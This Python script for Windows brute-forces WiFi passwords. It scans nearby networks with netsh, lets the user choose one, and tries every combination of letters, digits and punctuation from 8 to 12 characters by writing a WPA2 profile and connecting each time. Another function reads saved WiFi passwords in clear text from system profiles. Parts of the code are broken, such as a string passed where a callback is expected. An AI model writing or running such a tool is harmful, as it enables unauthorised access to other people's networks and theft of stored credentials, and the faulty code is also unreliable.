import itertools
import string
import time
import subprocess

def guess_the_string(try_password_callback):
    characters = string.ascii_letters + string.digits + string.punctuation
    attempts = 0

    for length in range(8, 13):  # Generate permutations for lengths 8 to 12
        for guess in itertools.product(characters, repeat=length):
            guessed_string = ''.join(guess)
            attempts += 1
            print(f"Attempt {attempts}: {guessed_string}")

            if try_password_callback(guessed_string):
                print(f"The program guessed the string '{guessed_string}' in {attempts} attempts!")
                with open("found_string.txt", "w") as file:
                    file.write(f"Found string: {guessed_string}\nAttempts: {attempts}")
                return guessed_string

    print("Failed to guess the string.")
    return None

def get_wifi_password(ssid):
    try:
        # Run the command to get WiFi details
        result = subprocess.run(["netsh", "wlan", "show", "profile", ssid, "key=clear"], capture_output=True, text=True)
        output = result.stdout

        # Extract the password from the output
        for line in output.splitlines():
            if "Key Content" in line:
                password = line.split(":")[1].strip()
                print(f"Retrieved WiFi password: {password}")
                guess_the_string(password)  # Use guess_the_string to verify the password
                return password

        print("Password not found in the profile.")
        return None
    except Exception as e:
        print(f"Error retrieving WiFi password: {e}")
        return None

def simulate_brute_force(target_password):
    characters = string.ascii_lowercase + string.digits
    attempts = 0
    start = time.time()

    for length in range(8, 13):  # Updated to guess between lengths 8 to 12
        for guess in itertools.product(characters, repeat=length):
            attempts += 1
            guess_str = ''.join(guess)
            if guess_str == target_password:
                elapsed = time.time() - start
                print(f"Password '{target_password}' found in {attempts} attempts and {elapsed:.2f} seconds.")
                with open("found_string.txt", "w") as file:
                    file.write(f"Found password: {target_password}\nAttempts: {attempts}\nTime: {elapsed:.2f} seconds")
                return

def show_available_ssids():
    try:
        # Run the command to list available WiFi networks
        result = subprocess.run(["netsh", "wlan", "show", "network"], capture_output=True, text=True)
        output = result.stdout

        # Extract SSIDs from the output
        ssids = []
        seen_ssids = set()  # Use a set to track seen SSIDs
        for line in output.splitlines():
            if "SSID" in line and "BSSID" not in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    ssid = parts[1].strip()
                    if ssid and ssid not in seen_ssids:  # Avoid empty and duplicate SSIDs
                        ssids.append(ssid)
                        seen_ssids.add(ssid)

        if ssids:
            return ssids
        else:
            print("No SSIDs found.")
            return []

    except Exception as e:
        print(f"Error retrieving SSIDs: {e}")
        return []

def connect_to_wifi(ssid, password):
    try:
        # Create a profile XML for the WiFi connection
        profile_xml = f"""<?xml version=\"1.0\"?>
        <WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">
            <name>{ssid}</name>
            <SSIDConfig>
                <SSID>
                    <name>{ssid}</name>
                </SSID>
            </SSIDConfig>
            <connectionType>ESS</connectionType>
            <connectionMode>auto</connectionMode>
            <MSM>
                <security>
                    <authEncryption>
                        <authentication>WPA2PSK</authentication>
                        <encryption>AES</encryption>
                        <useOneX>false</useOneX>
                    </authEncryption>
                    <sharedKey>
                        <keyType>passPhrase</keyType>
                        <protected>false</protected>
                        <keyMaterial>{password}</keyMaterial>
                    </sharedKey>
                </security>
            </MSM>
        </WLANProfile>"""

        # Save the profile to a temporary file
        profile_path = "wifi_profile.xml"
        with open(profile_path, "w") as file:
            file.write(profile_xml)

        # Add the profile to the system
        subprocess.run(["netsh", "wlan", "add", "profile", f"filename={profile_path}", "user=all"], check=True)

        # Connect to the WiFi network
        subprocess.run(["netsh", "wlan", "connect", f"name={ssid}"], capture_output=True, text=True)

        # Check connection status
        result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
        output = result.stdout

        if ssid in output and "State" in output and "connected" in output.lower():
            print(f"Successfully connected to {ssid}.")
            return True
        else:
            print(f"Failed to connect to {ssid}. Output: {output}")
            return False

    except Exception as e:
        print(f"Error connecting to WiFi: {e}")
        return False

if __name__ == "__main__":
    print("Scanning for available SSIDs...")
    ssids = show_available_ssids()
    if ssids:
        print("Available SSIDs:")
        for idx, ssid in enumerate(ssids, start=1):
            print(f"{idx}. {ssid}")

        selected_index = int(input("Select the SSID by number: ")) - 1
        if 0 <= selected_index < len(ssids):
            ssid = ssids[selected_index]
            print(f"Attempting to connect to SSID: {ssid}")

            def try_password(password):
                return connect_to_wifi(ssid, password)

            guess_the_string(try_password)
        else:
            print("Invalid selection.")
    else:
        print("No SSIDs found.")
